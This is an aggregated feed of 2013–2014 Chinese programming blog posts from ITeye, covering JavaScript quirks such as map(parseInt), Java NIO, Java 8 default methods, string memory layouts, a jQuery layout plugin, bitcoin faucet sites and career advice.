// remainder 函数求每个传入的值的个位数。（即除以 10 取余数）
var obj = { 
    divisor: 10, 
    remainder: function (value) { 
        return value % this.divisor; 
    } 
} 
// 定义一个包含 4 个元素的数组
var numbers = [6, 12, 25, 30]; 
// 对 numbers 数组的每个元素调用 obj 对象的 remainder 函数。
// map 函数的第 2 个参数传入 ogj。 
var result = numbers.map(obj.remainder, obj); 
document.write(result); 
// 输出: 
// 6,2,5,0
在下面的示例中，内置 JavaScript 方法用作回调函数。
// 对数组中的每个元素调用 Math.sqrt(value) （求平方根）
var numbers = [9, 16]; 
var result = numbers.map(Math.sqrt); 
document.write(result); 
// 输出: 3,4
[9, 16].map(Math.sqrt) 回调函数，输出的结果是 [3, 4]。 但是为什么 ["1", "2", "3"].map(parseInt) 却返回 [1,NaN,NaN]？
网站给出的提示是：
what you actually get is [1, NaN, NaN] because parseInt takes two parameters (val, radix) and map passes 3 (element, index, array)
简单翻译一下就是
parseInt 需要 2 个参数 (val, radix)， 而 map 传递了 3 个参数 (element, index, array)」。
通过上面的解释，我们可以看出，如果想让 parseInt(string, radix) 返回 NaN，有两种情况：
第一个参数不能转换成数字。
第二个参数不在 2 到 36 之间。
我们传入的参数都能转换成数字，所以只能是第二种可能。
到底是不是呢？我们重新定义 parseInt(string, radix) 函数：
var parseInt = function(string, radix) {
    return string + "-" + radix;
};
["1", "2", "3"].map(parseInt);
输出结果为：
["1-0", "2-1", "3-2"]
看见，map 函数将数组的值 value 传递给了 parseInt 的第一个参数，将数组的索引传递给了第二个参数。 第三个参数呢？我们再加一个参数
var parseInt = function(string, radix, obj) {
    return string + "-" + radix + "-" + obj;
};
["1", "2", "3"].map(parseInt);
输出结果：
["1-0-1,2,3", "2-1-1,2,3", "3-2-1,2,3"]
我们再继续增加参数：
var parseInt = function(string, radix, obj, other) {
    return string + "-" + radix + "-" + obj + "-" + other;
};
["1", "2", "3"].map(parseInt);
输出结果：
["1-0-1,2,3-undefined", "2-1-1,2,3-undefined", "3-2-1,2,3-undefined"]
第四个参数为 undefined，看见 map 确实为 parseInt 传递了三个参数。就像作者写道的：
(element, index, array)
数组的值
数组的索引
数组
UPDATE 原文勘误：（谢谢 米粽粽 提醒）
["1", "2", "3"].map(parseInt)
应该对应的是：
[parseInt("1", 0), parseInt("2", 1), parseInt("3", 2)]
parseInt("3", 2) 的第二个参数是界于 2-36 之间的，之所以返回 NaN 是因为 字符串 "3" 里面没有合法的二进制数，所以 NaN。
我们还可以继续试验:
> ["1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1", "1"].map(parseInt)
[1, NaN, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
只有当第二个参数是 1 的时候返回 NaN，其它情况都返回 1。
> ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"].map(parseInt)
[1, NaN, NaN, NaN, NaN, NaN, NaN, NaN, NaN, 9, 11, 13, 15, 17, 19, 21]
简单列举一下：
parseInt("1", 0);    // 十进制 1
parseInt("2", 1);    // 第二个参数不在 2-36 直接
parseInt("3", 2);    // 二进制 NaN
parseInt("4", 3);    // 三进制
parseInt("5", 4);
parseInt("6", 5);
parseInt("7", 6);
parseInt("8", 7);
parseInt("9", 8);
parseInt("10", 9);   // 九进制 （1*9+0 = 9）
parseInt("11", 10);  // 十进制 （1*10+1 = 11）
parseInt("12", 11);
parseInt("13", 12);
parseInt("14", 13);
parseInt("15", 14);
parseInt("16", 15);
（全文完）
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
图解 MVC 和 MVP 模式, justjavac.iteye.com.blog.1998210, Thu, 02 Jan 2014 10:54:32 +0800

起初，只有命令行。
软件工程师的灵就运行在 shell 上。
Xerox 说：「要有 GUI」……
一、桌面软件的 MVC
感谢 Smalltalk。感谢 GUI。
二、B/S 架构的 MVC
后来，互联网兴起，于是程序员把自己的程序放到服务器上运行，此时 GUI 发生了变化。所有的界面的现实 （View层）换成了浏览器（HTML）。
此时，MVC 被带到了 BS 架构。感谢 sun。感谢 struts。
三、前端的 MVP
再后来，浏览器越来越强悍，于是很多的业务放到了浏览器里面来执行。
于是程序员们把 MVC 带到了 View 层。但是用 HTML+CSS+JS 做显示层，和传统的桌面 GUI 又有很大区别。 于是，为了充分发挥 js 语言的特点，MVP 就出现了。
已有 7 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java NIO与IO的详细区别(通俗篇), justjavac.iteye.com.blog.1998207, Thu, 02 Jan 2014 10:51:43 +0800

内核空间、用户空间、计算机体系结构、计算机组成原理、……确实有点儿深奥。
 
我的新书《代码之谜》会有专门的章节讲解相关知识，现在写个简短的科普文：
 
就速度来说 CPU > 内存 > 硬盘
 
I- 就是从硬盘到内存
O- 就是从内存到硬盘
第一种方式：我从硬盘读取数据，然后程序一直等，数据读完后，继续操作。这种方式是最简单的，叫阻塞IO。
 
第二种方式：我从硬盘读取数据，然后程序继续向下执行，等数据读取完后，通知当前程序（对硬件来说叫中断，对程序来说叫回调），然后此程序可以立即处理数据，也可以执行完当前操作在读取数据。
 
在以前的 Java IO 中，都是阻塞式 IO，NIO 引入了非阻塞式 IO。
 
还有一种就是同步 IO 和异步 IO。经常说的一个术语就是“异步非阻塞”，好象异步和非阻塞是同一回事，这大概是一个误区吧。
 
至于 Java NIO 的 Selector，在旧的 Java IO 系统中，是基于 Stream 的，即“流”，流式 IO。
 
当程序从硬盘往内存读取数据的时候，操作系统使用了 2 个“小伎俩”来提高性能，那就是预读，如果我读取了第一扇区的第三磁道的内容，那么你很有可能也会使用第二磁道和第四磁道的内容，所以操作系统会把附近磁道的内容提前读取出来，放在内存中，即缓存。
 
（PS：以上过程简化了）
 
通过上面可以看到，操作系统是按块 Block从硬盘拿数据，就如同一个大脸盆，一下子就放入了一盆水。但是，当 Java 使用的时候，旧的 IO 确实基于 流 Stream的，也就是虽然操作系统给我了一脸盆水，但是我得用吸管慢慢喝。
 
于是，NIO 横空出世。
已有 37 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
告别码农，成为真正的程序员, justjavac.iteye.com.blog.1995172, Wed, 25 Dec 2013 10:38:09 +0800

本文是我借助 Google 从网上拼凑的文章，可能条理不是很清晰，希望对广大程序员们有些帮助。
一、成长的寓言：做一棵永远成长的苹果树
一棵苹果树，终于结果了。
第一年，它结了10个苹果，9个被拿走，自己得到1个。对此，苹果树愤愤不平，于是自断经脉，拒绝成长。
第二年，它结了5个苹果，4个被拿走，自己得到1个。「哈哈，去年我得到了10%，今年得到20%! 翻了一番」。
这棵苹果树心理平衡了。
但是，它还可以这样：继续成长。
譬如，第二年，它结了100个果子，被拿走90个，自己得到10个。很可能，它被拿走99个，自己得到1个。
但没关系，它还可以继续成长，第三年结1000个果子……
其实，得到多少果子不是最重要的。最重要的是，苹果树在成长!等苹果树长成参天大树的时候，那些曾阻碍它成长的力量都会微弱到可以忽略。真的，不要太在乎果子，成长是最重要的。
切记：
如果你是一个打工族，遇到了不懂管理、野蛮管理或错误管理的上司或企业文化，那么，提醒自己一下，千万不要因为激愤和满腹牢骚而自断经脉。不论遇到什么事情，都要做一棵永远成长的苹果树，因为你的成长永远比每个月拿多少钱重要。
二、人人都需要时间管理
一项国际查表明：一个效率糟糕的人与一个高效的人工作效率相差可达10倍以上。
哈佛有一个著名的理论：人的差别在于业余时间，而一个人的命运决定于晚上8点到10点之间。每晚抽出2个小时的时间用来阅读、进修、思考或参加有意的演讲、讨论，你会发现，你的人生正在发生改变，坚持数年之后，成功会向你招手。
我曾整理了一份『免费的编程中文书籍索引』（去github查看，也可以到CSDN CODE），每天抽出半个小时来读一读。
时间管理可以帮助您把每一天、每一周甚至每个月的时间进行有效的合理安排。运用这些时间管理技巧帮您统筹时间，对于每个人来说都是非常重要的。
在时间管理中，计划组织相对于其他技巧来说是最简单的一种。比如，所有的时间管理建议都包括在一些表格当中，在表格中把您想要完成的任务填进去。对很多人来说，这是最简单和普通的了。
三、别人能成功的事，未必自己就能成功
飞机上，乌鸦对乘务员说：给爷来杯水！
猪听后也学道：给爷也来杯水！
乘务员把猪和乌鸦扔出机舱，乌鸦笑着对猪说：傻了吧？爷会飞！
外界因素是一种约束条件，自身能力也是一种约束条件, 往往更重要。所以，别人能成功的事，未必自己就能成功。
四、你搜索到的只是网页，不是知识
知识的类型及它在程序员大脑中如何成长。
有三类知识：
概念知识（为什么、是什么、如果——语义上的）——理解软件系统构建过程中的概念、原理、关系及主要方法。
实践性知识（如何做——过程中的）—— 关于如何解决特定编程问题的知识。这类知识不需要深入理解实现方法选择过程中隐含的概念及基本原理。
隐性知识（专业知识、经验及直觉）——基于软件系统实现过程中所积累的个人经验，在大脑中形成的内在知识。这类知识很难传授，因为它的大部分都存储在我们的潜意识中。
可解决实际问题的高效搜索
A. 查找Seek
定义Definition——弄清楚要解决什么问题，并以要查找的内容为焦点。
检索Retrieval（使用标准的Google、代码搜索或其他的检索引擎）—有很多关于如何高效的使用检索引擎的建议。
浏览结果Browse（内容的质量、可信度及专业技术的水平；如果资料的可信度过低，无须再看）-> 阅读 -> 评估（人力物力、所需工具及函数库）
B. 使用 Use
复制代码 - 单独复制（针对这一目的，带有长钉技术的显式单元测试最适合）。
清除代码 - 仅保留最小限度、相关性代码，清除解决方案中的其它代码。
应用代码 - 在系统中应用代码。
C. 学习Learn
理解Understand——你做了什么及你为什么那样做——从代码和实现中学习。
扩充知识Expand——
实践性知识Practical：解决问题的特定方法、技巧及风格；
概念知识Concept：学习新概念、提炼现有的并构建自己的概念；
隐性知识Recessive：明智地使用并学习搜索到的解决方案，经验会自然而然地得到增长。
收集Collect（链接、意见、参考文献、阅读清单）—任何对你今后搜索、发现及学习有用的有趣信息。为这些目标积累知识。
还有一点也很重要: 分享与交流。
最后还是我在博客中经常写道的那句话（不要嫌我罗嗦，再写一遍），学历代表过去，能力代表现在，学习能力代表未来。
已有 26 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JavaScript 的怪癖 4：未知变量名创建全局变量, justjavac.iteye.com.blog.1983810, Mon, 02 Dec 2013 15:25:48 +0800

原文：JavaScript quirk 4: unknown variable names create global variables
译者：justjavac
此文是 javascript 的 12 个怪癖（quirks） 系列的第四篇。
当你使用了一个未知的变量名，通常 JavaScript 会自动创建全局变量：
function f() { foo = 123 } f() foo 123
好在你会在 ECMAScript5 的严谨模式得到警告[1]：
function f() { 'use strict'; foo = 123 } f() ReferenceError: foo is not defined
参考
[1] JavaScript’s strict mode: a summary
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JavaScript 的怪癖 5：参数的处理, justjavac.iteye.com.blog.1983808, Mon, 02 Dec 2013 15:23:24 +0800

原文：JavaScript quirk 5: parameter handling
译者：zhmengqing
此文是 javascript 的 12 个怪癖（quirks） 系列的第五篇。
JavaScript 参数处理的基本原理很简单，高级的任务都需要手动操作。 本文首先关注其基本原理然后再行扩展。
1、参数处理的基本原理
JavaScript 的参数处理包括两个要点
1.1、要点：你可以传递任意数量的参数
当调用一个 function 时，你想传递多少参数都可以，这与该函数声明了多少个正式的参数无关。 缺失参数的值是undefined，多出来的参数则直接被忽略掉。
我们用以下的函数做个示范：
function f(x, y) {
    console.log('x: '+x);
    console.log('y: '+y);
}
你可以用任意数量的参数调用这个 function：
> f()
x: undefined
y: undefined
> f('a')
x: a
y: undefined
> f('a', 'b')
x: a
y: b
> f('a', 'b', 'c')
x: a
y: b
1.2要点：所有传递的参数都储存在 arguments 中
所有传递的参数都储存在一个很特别、很像 Array（继续看就能知道为什么了）的变量里，arguments。 通过下面的function 我们来看下这个变量怎么用的：
function g() {
    console.log('Length: '+arguments.length);
    console.log('Elements: '+fromArray(arguments));
}
下面是 fromArray 函数，它把 arguments 转换成 array 这样就能存入数据了，调用 g()：
> g()
Length: 0
Elements:
> g('a')
Length: 1
Elements: a
> g('a', 'b')
Length: 2
Elements: a,b
无论明确声明了多少个参数，arguments 是永远在那里的，它总是包含所有实际的参数。
2、参数传递了吗？
如果调用者没有提供参数，那么 undefined 就会传递给 function。 因为 undefined 是一个虚拟值[1]，你可以用一个 if 条件语句来检验它是否存在：
function hasParameter(param) {
    if (param) {
        return 'yes';
    } else {
        return 'no';
    }
}
这样，你不传参数与传入 undefined 获得的结果是一样的：
'no'
> hasParameter(undefined)
'no'
测试代码对真实值(truthy)同样有效：
> hasParameter([ 'a', 'b' ])
'yes'
> hasParameter({ name: 'Jane' })
'yes'
> hasParameter('Hello')
'yes'
而对于虚拟值(falsy)的会用是需要多加小心的。 比如 false、0 以及空字符串都被解析为缺失参数：
> hasParameter(false)
'no'
> hasParameter(0)
'no'
> hasParameter('')
'no'
这段代码足以证明。 你必须要多加注意，因为代码变得更加紧凑与调用者是否忽略了一个参数还是传递了 undefined 或者null 都无关。
3、参数的默认值
以下的 function 可以传入 0 或者其他参数，x 和 y 如果未传参数则会是 0，以下是一种表现方式：
function add(x, y) {
    if (!x) x = 0;
    if (!y) y = 0;
    return x + y;
}
交互后：
> add()
0
> add(5)
5
> add(2, 7)
9
你可以用 or 运算符（||）使 add() 更简洁。 如果为真这个运算符会返回第一个值否则返回第二个。
例如：
> 'abc' || 'def'
'abc'
> '' || 'def'
'def'
> undefined || { foo: 123 }
{ foo: 123 }
> { foo: 123 } || 'def'
{ foo: 123 }
我们用 || 来指定参数默认值：
function add(x, y) {
    x = x || 0;
    y = y || 0;
    return x + y;
}
4、任意数量的参数
你也可以用 arguments 来接收任意数量的参数，其中一个例子是以下的函数 format()，它在 C 函数 sprintf 之后输出语句：
> format('Hello %s! You have %s new message(s).', 'Jane', 5)
'Hello Jane! You have 5 new message(s).'
第一个参数是一个样式，由 %s 标记空白，后面的参数则填入这些标记，简单的 format 函数实现如下：
function format(pattern) {
    for(var i=1; i < arguments.length; i++) {
        pattern = pattern.replace('%s', arguments[i]);
    }
    return pattern;
}
注意：循环跳过了第一个参数(arguments[0]) 并且忽略了 pattern。
5、强制执行一定数量的参数
如果你想要强制调用者执行一定数量的参数，你就要在运行阶段检查 arguments.length：
function add(x, y) {
    if (arguments.length > 2) {
        throw new Error('Need at most 2 parameters');
    }
    return x + y;
}
6、arguments 不是 array
arguments 并不是 array，它只是很像 array，你可以获取第 i 个参数比如 arguments[i]， 你也可以检查它有多少个参数比如 arguments.length。 但是你不能用 Array 的方法如 forEach 或者 indexOf。 更多详情与解答会在「怪癖8（未翻译）」中进行讨论，作为一个预习，以下函数能将一个类似 array 的值转换为 array：
function fromArray(arrayLikeValue) {
    return Array.prototype.slice.call(arrayLikeValue);
}
7、参考
[1] JavaScript quirk 1: implicit conversion of values [解释了“真实值(truthy)”与“虚拟值(falsy)”]
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
jQuery响应式瀑布流布局插件 - Grid-A-Licious, justjavac.iteye.com.blog.1983772, Mon, 02 Dec 2013 14:34:12 +0800

最近瀑布流布局比较流行，那么今天就给大家介绍一个这样的 jQuery 插件 - Grid-A-Licious。
 
 
 
Grid-A-Licious 是一个简单易用的 jQuery 插件，可用于创建响应式瀑布流布局，针对不同设备可自动适应宽度。你可以通过参数设置它的宽度以及动态显示时的速度、延迟等等，定制性是比较高的。
如何使用
首先在 HTML 页面头部中引入 jQuery 框架和 Grid-A-Licious 插件
 
<script src="http://kfxx.info/js/jquery.1.8.0.min.js"></script>
<script src="http://kfxx.info/js/jquery.grid-a-licious.min.js"></script>
然后按如下方式添加内容，可自定义设置item样式  
<div id="demo">
<div class="item">
演示演示
</div>
....任意个div
<div class="item">
<div>测试内容...</div>
</div>
</div>
最后初始化即可
$("#demo").gridalicious({
    gutter: 10,
    width: 200,
    animate: true,
    animationOptions: {
        speed: 150,
        duration: 300,
        complete: onComplete
    },
});
 
演示： demo
已有 11 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
苦B程序员们，你的法拉利呢？, justjavac.iteye.com.blog.1980823, Tue, 26 Nov 2013 11:34:46 +0800

每当我说起「每月大概在亚马逊买100块钱的书」，别人都会问我：
天天这么忙，哪有时间读书？
我都会给他讲如下的段子：
女：你抽烟吗？男：抽。
女：每天多少包？男：三包。
女：每包多少钱？男：10英镑。
女：你抽烟多久了？男：15年。
女：所以这些年来每年你抽烟就花了10800英镑。男：正确。
女：1年10800英镑，不考虑通货的话，过去的15年里你抽烟总共花了162000英镑对吗？男：嗯。
女：你知道吗？如果你没有抽烟，把这些钱放在一个高利息的储蓄账户里，按复合利率来算。你现在能买一辆法拉利了。
女：那你戒烟吗？ 男：不戒。
女：为什么？
男：你抽烟吗？女：不。
男：那麻痹你的法拉利呢？
已有 14 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
如何获取免费比特币？, justjavac.iteye.com.blog.1980812, Tue, 26 Nov 2013 11:26:36 +0800

github 地址：如何免费获得比特币？
 
前言
转自我的微博：
曾经有8个比特币放在我的比特钱包里，我没有珍惜，等到失去他的时候后悔莫及啊，如今，只有0.2个了。
以下是正文：
免费获取比特币的站点
欢乐95
最轻松的 BTC 获取方式，有多种获取 BTC 的方式：
每日登录返 BTC，每周登录6天奖励 BTC，每月连续登录25天奖励 BTC……
淘宝购物返 BTC
抽奖：可以用自己的积分参与抽奖（风险太大，手气不好的话就别玩了）。
CoinURL
国外的网站，多语言版（简体中文不是很完善，个别页面还都是英文的）。获取方式：
制作短链接，获取比特币，每个免费用户可以制作1万个短链接（足够了）。
如果你有自己的网站，可以制作类似 Google Ad 的广告，赚取 BTC。
如果想快速获取 BTC，推荐试试这个，比较老外出手比较大方。
CoinAd
国外网站，无中文。
不过，操作很简单，看广告，赚比特币。点击 “View Ads” 菜单，则出现广告列表，根据要求点击广告页面，只要停留特定时间，就可以赚取比特币了。一般是比特币较多的广告停留时间越长。
Freebitco.in ★★★★★
免费比特币游戏站，最高赢 0.3 BTC。
每隔一小时可以免费玩转盘，根据数字随机赠送比特币。
DailyBitcoin
输入验证码拿币，每小时一次。
比特币交易市场
OKCoin
中文。OKCoin平台采用SSL、GSLB、分布式服务器、离线存储等先进技术保证了平台的安全和稳定，充值即时到帐0手续费，方便快捷！
绑定邮箱手机即赠送0.001BTC。
cny2btc
中文。从域名就可以看出了，CNY to BTC。汇率走势每分钟更新一次。
已有 10 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
[福利] 开发者必备的 Chrome 插件——ChromeSnifferPlus, justjavac.iteye.com.blog.1974174, Wed, 13 Nov 2013 10:14:56 +0800

ChromeSnifferPlus
Chrome Sniffer Plus： Chrome 探测器，可以探测正在使用的开源软件或者 js 类库，开发者必备。
通过本插件，您可以探测：
javascript 库： jQuery、ExtJS、Angular 等。
常用的 web 服务： 百度统计、cnzz、Google Analytics 等。
Web 框架： WordPress、phpBB、Drupal、MediaWiki 等。
服务器环境： PHP、Apache、nginx 等。
当你安装此插件去浏览网页时，还可以发现更多你未知的框架和库。
如果你发现了还不能探测的类库，可以在下面留言。
如果你是类库、框架的开发者，可以将你类库框架的探测方式通知我，让更多人的知道你的类库框架。
查看更新日志
安装
本插件还放在 Chrome Web Store，暂时放在百度网盘里面，下载地址： http://pan.baidu.com/s/1j8ZrU
由于 Google 更改了 Chrome 插件的安装策略，禁止直接下载安装非 Chrome WebSrore 的插件。 因此必须手动安装：
打开 Chrome 扩展页面，在浏览器直接访问 chrome://extensions。或者点击右上角 --> 工具 --> 扩展程序。
将下载的插件文件 ChromeSnifferPlus-x.x.x.crx 拖放到 Chrome 中
安装完成
截图
                  
 
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 8与静态工具类, rednaxelafx.iteye.com.blog.2033104, Wed, 19 Mar 2014 08:43:07 +0800
以前要在Java里实现所谓“静态工具类”（static utility class）的话，通常会做两件事：1、把class声明为final，以免被继承；2、声明一个private的空参数列表构造器，以免外部能创建该类的实例。 根据Java SE 8版的Java语言规范，9.4小节，现在Java 8允许在接口上声明静态方法了。接口默认而且必须是抽象的，所以不能用final来阻止别人继承或实现这个接口，不过反正是抽象的也不能直接实例化，用来做静态工具类挺好的。 所以现在可以这样了：package my.util;
public interface StringUtils {
  /* 默认public */ static boolean endsWith(String str, String suffix) {
    // ...
  }
}  多一种选择 
已有 4 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 8的default method与method resolution, rednaxelafx.iteye.com.blog.2033089, Wed, 19 Mar 2014 02:23:36 +0800
先看看下面这个代码例子，interface IFoo {
  default void bar(int i) {
    System.out.println("IFoo.bar(int)");
  }
}
public class Foo implements IFoo {
  public static void main(String[] args) {
    Foo foo = new Foo();
    foo.bar(42);  // (1) invokevirtual Foo.bar(int)void
    IFoo ifoo = foo;
    ifoo.bar(42); // (2) invokeinterface IFoo.bar(int)void
  }
  public void bar(long l) {
    System.out.println("Foo.bar(long)");
  }
} (1)与(2)分别应该调用哪个版本的方法呢？ Java 8的接口上的default method，或者叫virtual extension method，目的是为了让接口可以“事后”添加新方法而无需强迫所有实现该接口的类都提供新方法的实现。也就是说它的主要使用场景可能会涉及“代码演进”。 所以让我们把例子退回到代码演进的更早阶段。或许以前这段代码是这样的：interface IFoo {
}
public class Foo implements IFoo {
  public static void main(String[] args) {
    Foo foo = new Foo();
    foo.bar(42);  // (1) invokevirtual Foo.bar(long)void
  }
  public void bar(long l) {
    System.out.println("Foo.foo(long)");
  }
} 此时的(1)处会调用到Foo.bar(long)方法。 但是当IFoo新添加了新方法bar(int)并提供默认实现之后，(1)就会被“劫持”到IFoo.bar(int)的默认实现上，因为这个版本的signature提供了更准确的匹配。 这种“劫持”行为似乎很符合Java的一贯语义，但是很容易给码农挖坑啊orz… 当前版本的Java 8语言规范草案：http://cr.openjdk.java.net/~mr/se/8/java-se-8-fr-spec-01/java-se-8-jls-fr-diffs.pdf
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
字符串的一般封装方式的内存布局 (1): 元数据与字符串内容，整体还是分离？, rednaxelafx.iteye.com.blog.1969861, Thu, 07 Nov 2013 17:44:27 +0800
（Disclaimer：未经许可请勿转载。如需转载请先与我联系。作者：RednaxelaFX -> rednaxelafx.iteye.com） 字符串的一般封装方式的内存布局系列：(0): 拿在手上的是什么  1、元数据，字符串内容：整体还是分离？  接上一篇，这次来看看字符串元数据，以及它与字符串内容是整体还是分离式。 字符串常见的元数据都是可选的，例如：* 指向字符串内容的指针/引用  如果是整体式就不需要这种信息，而分离式会需要一个指针指向字符串实际内容。* 字符串长度  可能是字符个数（如ASCII编码的std::string），code unit个数（如Java、.NET、JavaScript这些要把字符串表现为sequence of UTF-16 code units的），字符串的实际字节数（如BSTR）。各有用途，各有优缺点。  如果字符串要求以'\0'结尾而且字符串内不允许包含'\0'，那么字符串长度就是可选元数据；否则是必要的。* 偏移量  假如某个string类型可以表示别的string的子串并且共享buffer，就可能会记录偏移量。偏移量可以是下标，也可以是指针，取决于系统只允许执行对象头部的指针，还是也允许指向对象内部的指针。* 字符串哈希值  纯粹是一种缓存性质的优化，提高string作为哈希容器的键时的性能。* 字符串编码  这只存在于允许使用多种编码存放字符内容的字符串实现中，例如Ruby 1.9或更高版本的String类。只能使用固定编码的字符串类型不需要这个信息，因为已经隐含在类型里了，如Java与.NET的内建字符串实现。 既然上述元数据都是可选的，那就可以都不要，做成最“裸”的方式。陈硕大大写的一个可以用在面试题中的C++字符串实现就是这样：只封装了一个char*成员。 假如某个字符串类型带有上述可选元数据，那就有“整体式”和“分离式”的区别。顾名思义，前者就是元数据与字符串内容粘在一起作为一个整体；后者则是至少有部分元数据与字符串内容分离开，一个“字符串实例”由多个对象组合构成。 “整体式”，例如说32位x86上.NET 4.0的System.String的内存布局是这样的："foobar"28字节:
       System.String (C#视角) / StringObject (C++视角)
    (-4) [ m_SyncBlockValue               ] \ ObjHeader: sync block index
--> (+0) [ m_pMethTab                     ] / Object: MethodTable pointer
    (+4) [ m_stringLength  = 0x00000006   ] // length, in code unit count
    (+8) [ m_firstChar     = 0x0066 ('f') ] // string contents starts here
   (+10) [                   0x006F ('o') ]
   (+12) [                   0x006F ('o') ]
   (+14) [                   0x0062 ('b') ]
   (+16) [                   0x0061 ('a') ]
   (+18) [                   0x0072 ('r') ]
   (+20) [                   0x0000       ] (null-terminate)
   (+22) [ (padding)         0x0000       ] 其中m_SyncBlockValue与m_pMethTab是.NET对象都有的元数据，可以看作对象头先不管；m_stringLength是字符串元数据，而从m_firstChar开始后面就是字符串的实际内容，最后以'\0'结尾，外加由4字节对齐要求而带来的2字节padding。可以很明显的看到System.String的元数据就这样与实际字符串内容打包成一个整体放在同一个对象内。 “分离式”与之相对。看看64位Oracle JDK7u40/OpenJDK 7u的java.lang.String例子（假定开了压缩指针）："foobar"24字节:
java.lang.String (Java视角) / oopDesc (C++视角)
--> (+0) [ _mark                ]      32字节:
    (+8) [ _metadata            ]      char[] (Java视角) / typeArrayOopDesc (C++视角)
   (+12) [ value                ]   --> (+0) [ _mark                  ]
   (+16) [ hash    = 0x00000000 ]       (+8) [ _metadata              ]
   (+20) [ (padding) 0x00000000 ]      (+12) [ _length = 0x00000006   ]
                                       (+16) [           0x0066 ('f') ]
                                       (+18) [           0x006F ('o') ]
                                       (+20) [           0x006F ('o') ]
                                       (+22) [           0x0062 ('b') ]
                                       (+24) [           0x0061 ('a') ]
                                       (+26) [           0x0072 ('r') ]
                                       (+28) [ (padding) 0x00000000   ] （在我以前做的一个演示稿里有画得更漂亮的图，请参考）这里，字符串的元数据部分与实际内容明显被拆分为两块：* 元数据就两个字段，一个是指向实际内容的value字段，另一个是缓存哈希值的hash字段。都存在固定长度的java.lang.String实例中；* 实际字符串内存存在另外一个char[]对象里。这个数组对象包含了字符串长度的元数据。 上一篇提到的Ruby 1.8.7的Symbol就更加分离了。不过那也算是个特例。 显然，整体式比分离式更紧凑，占用内存更少且数据局部性高。那为啥要用分离式？至少有以下几个可能性： 1) 分离式比整体式需要更少的“特殊类型”。  一些基于类的面向对象语言实现，例如Oracle/Sun JDK 6所实现的Java，数组是唯一可变长度的对象类型（注1）。换句话说，只有其它对象只要确定其类型就可以知道对象大小；而数组光确定了类型还不够，需要在数组实例里保存长度信息，结合类型和长度确定对象大小。 在这样的实现里，其它本来语义是可变长度的类型可以依赖数组来实现，就像上面例子中的java.lang.String，它自身的对象大小是固定的，可变长度的部分交由char[]来实现。java.util.ArrayList、HashMap等亦然。不依赖数组也还可以借助链式结构来实现可变长类型，例如java.util.LinkedList所实现的链表。 用定长对象包装变长的数组，这种组合方式已经能满足许多编程语言对变长对象的实现需求。而且因为它把“可变长度”限定在数组这一种特殊类型里，某些人也认为这样的设计比较“干净。也可以说这样便于偷懒。 即便如C++一样灵活的语言，如果我们只用内建的new运算符来创建对象（不重载new、不用placement new、不定制allocator），那也只有数组是可变长度的，而类的实例大小都跟sizeof运算符在编译期得到的结果一样（注2）。用C++的这个子集来写程序的话，实现变长数据结构也常用数组（或者std::vector<T>，而它里面也依赖了动态分配出来的数组）。在这个子集外，C++允许定制分配行为，给对象分配出实际比sizeof的值更大的内存空间，这样就可以自制特殊的可变长数据结构。某些人也认为这样的设计比较“不干净”。我是无所谓… 上面展示的CLRv4所实现的System.String类型则必须是数组之外的又一个特殊类型，在VM里必须有专门的支持，跟数组的支持代码类似但又不完全一样所以得多写一份特殊实现。要偷懒就不会选这条路，但要高性能的话反正对string也得做特化实现，做成特殊类型又何妨（看向JVM…） Java这边也有研究把java.lang.String做成特殊类型的，收益不错。可以参考下面一系列论文：Automatic Object Inlining in a Java Virtual Machine Optimized Strings for the Java HotSpot VM Compact and Efficient Strings for Java 从Oracle JDK7开始反正java.lang.String也抛弃了子串共享，说不定哪天就能用上论文里说的特化实现。JDK9？呵呵。 注1：Oracle JDK7或以上版本里的HotSpot VM里，java.lang.Class实例也变成可变长的类型了。所以上面文字特地限定了版本。注2：即便C++14草案里的runtime-sized array也不能作为对象实例的成员。 2) 分离式有更高的灵活度  整体式方案通常不会用到“指向字符串内容的指针”这种元数据，而是要求字符串内容必须从字符串对象的某个固定偏移量开始。这样紧凑归紧凑，要做些灵活的变化就困难了。（注意是“通常”不是“绝对”喔。） 分离式则通常会有“指向字符串内容的指针”的元数据，便于灵活实现一些功能：* 让外界自由指定字符串实际内容的来源，无论是全局数据区、栈上、堆上。vzch大大的vl::ObjectString<T>就允许这种可能性* 让多个字符串实例共享一个buffer。这包括子串共享的场景等等。
              
              
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
字符串的一般封装方式的内存布局 (0): 拿在手上的是什么, rednaxelafx.iteye.com.blog.1969833, Mon, 04 Nov 2013 18:22:06 +0800
